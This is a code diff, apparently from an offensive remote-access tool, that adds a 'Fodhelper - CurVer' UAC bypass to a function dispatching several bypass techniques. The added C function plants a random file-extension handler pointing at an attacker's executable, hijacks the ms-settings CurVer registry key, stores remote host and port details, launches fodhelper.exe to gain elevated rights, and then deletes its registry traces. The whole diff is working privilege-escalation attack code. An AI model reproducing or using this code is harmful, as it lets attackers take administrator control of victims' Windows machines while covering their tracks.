@@ -96,6 +96,56 @@ BOOL ExploitOpenShell(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPA
     free(regKey);
     return returnValue;
 }
+BOOL ExploitCurVer(char* PathExeToRun, WCHAR* ipAddress, char* port){
+    PVOID pOldVal = NULL;
+    const char* regKeys[] = {
+        "Software\\Classes\\%s","\\Shell\\Open\\command",
+        "Software\\Classes\\ms-settings\\CurVer"
+    };
+    BOOL returnValue = FALSE;
+    int regKeyCommandLen = strlen(regKeys[0]) + strlen(regKeys[1]) + 4;
+    char* regKeyCommand = (char*)malloc(regKeyCommandLen);
+    if (regKeyCommand == NULL)
+        return FALSE;
+    char* extName = (char*)malloc(4 + 1);
+    if (extName == NULL){
+        free(regKeyCommand);
+        return FALSE;
+    }
+
+    extName[0] = '.';
+
+
+    GenRandDriverName(extName + 1, 3);
+    sprintf_s(regKeyCommand, regKeyCommandLen, regKeys[0], extName);
+    while (CheckExistKey(regKeyCommand) && strcmp(extName, ".pwn") != 0){
+        GenRandDriverName(extName + 1, 3);
+        sprintf_s(regKeyCommand, regKeyCommandLen, regKeys[0], extName);
+    }
+    strcat_s(regKeyCommand, regKeyCommandLen, regKeys[1]);
+
+    DisableWindowsRedirection(&pOldVal);
+    if (checkKey(regKeyCommand) && checkKey(regKeys[2])){
+        returnValue = SetRegistryValue(HKEY_CURRENT_USER, regKeyCommand, "", PathExeToRun);
+        returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKeys[2], "", extName);
+        if (returnValue){
+            if (SaveRHostInfo(ipAddress, port)){
+                returnValue = ((int)ShellExecuteA(NULL, "runas", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOWNORMAL) > 32);
+                Sleep(1000);
+            } else
+                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
+            ExploitCleanUp((char*)"Software\\Classes", "ms-settings");
+            ExploitCleanUp((char*)"Software\\Classes", extName);
+        }
+    }
+    RevertWindowsRedirection(pOldVal);
+
+    free(extName);
+    free(regKeyCommand);
+    return returnValue;
+}
+
+
 
 BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
     BOOL returnValue = FALSE;
@@ -118,6 +168,9 @@ BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_T
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
                     returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);
 
+                } else if (UacBypassTec == UAC_BYPASS_FOD_HELP_CUR_VER){
+                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Fodhelper - CurVer'\n");
+                    returnValue = ExploitCurVer(PathExeToRun, ipAddress, port);
                 } else if (UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR){
 
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
